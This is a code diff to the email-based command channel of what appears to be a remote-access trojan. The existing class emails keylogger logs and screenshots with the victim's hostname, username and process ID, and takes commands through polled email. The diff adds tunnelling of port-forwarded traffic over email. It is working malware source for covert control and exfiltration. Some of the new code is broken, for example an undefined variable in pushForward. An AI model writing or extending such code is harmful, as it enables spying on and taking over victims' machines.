@@ -16,6 +16,8 @@ import queue
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 
+import threading
+
 from localAgent import LocalAgent
 
 class SimpleEmail:
@@ -36,6 +38,7 @@ class EMailAgent(LocalAgent):
 
 	SCREENSHOT_EMAIL_TAG = "Screenshot: ";
 	KEYLOGGER_EMAIL_TAG = "Keylogger: ";
+	PORTFORWARD_EMAIL_TAG = "PortForward: "
 	HARVEST_EMAIL_TAG = "HARVEST";
 	PROTOCOL_TAG = "PROTOCOL";
 	USERNAME_TAG = "USERNAME";
@@ -45,6 +48,51 @@ class EMailAgent(LocalAgent):
 	hostname = socket.gethostname()
 	pid = os.getpid()
 	username = getpass.getuser()
+
+	q = queue.Queue()
+	forwardQueues = {}
+    
+	curlLock = threading.Lock()
+
+	def pushForward(self, forwardID, data):
+		if not forwardID in self.forwardQueues:
+			self.forwardQueues[forwardID] = queue.Queue()
+		im_b64 = base64.b64encode(data).decode('ascii')
+		subject = self.PORTFORWARD_EMAIL_TAG + forwardId + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
+		self.sendEmail(subject, im_b64);
+
+
+	def processNextEmail(self):
+		try:
+			print("Locking");
+			self.curlLock.acquire()
+			print("Polling");            
+			email = self.getNextEmail()
+			print("Releasing");            
+			self.curlLock.release()
+			print("Released");            
+			if(email.subject.startswith(self.PORTFORWARD_EMAIL_TAG)):
+				elements = email.subject.split(" ")
+				print("Forward");
+			else:
+				print("Next!");            
+				self.q.put(email.body)
+			return "Found"
+		except Exception as e:
+			print("Oops, something went wrong in processNextEmail: {}".format(e), file=sys.stderr)
+			print("Releasing");            
+			self.curlLock.release()
+			return "No email"
+
+	def pollForward(self, forwardID):
+		if not forwardID in self.forwardQueues:
+			self.forwardQueues[forwardID] = queue.Queue()
+		if self.forwardQueues[forwardID].empty():
+			self.processNextEmail()
+		if self.forwardQueues[forwardID].empty():
+			return None
+		else:
+			return base64.decodebytes(self.forwardQueues[forwardID].get().encode('ascii'))    
 
 	def buildEmailSubject(self, hostname, username, pid, protocol):
 		return self.HOSTNAME_TAG + ":" + hostname + " " + self.USERNAME_TAG + ":" + username + " " +self.PROTOCOL_TAG + ":" +protocol + " " + self.PID_TAG + ":" + str(pid);
@@ -113,11 +161,21 @@ class EMailAgent(LocalAgent):
 		return SimpleEmail(sender, subject, body);    
     
 	def pollServer(self):
+		
 		try:
 			email = self.getNextEmail()
 			return email.body
 		except Exception as e:
-			return "<control> No Command"             
+			return "<control> No Command"  
+		"""
+		if self.q.empty():
+			print("Processing next email")
+			self.processNextEmail()
+		if self.q.empty():
+			return "<control> No Command"
+		else:
+			return self.q.get()
+		"""
 
 	def postKeylogger(self, log):
 		subject = "Keylogger: " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG)
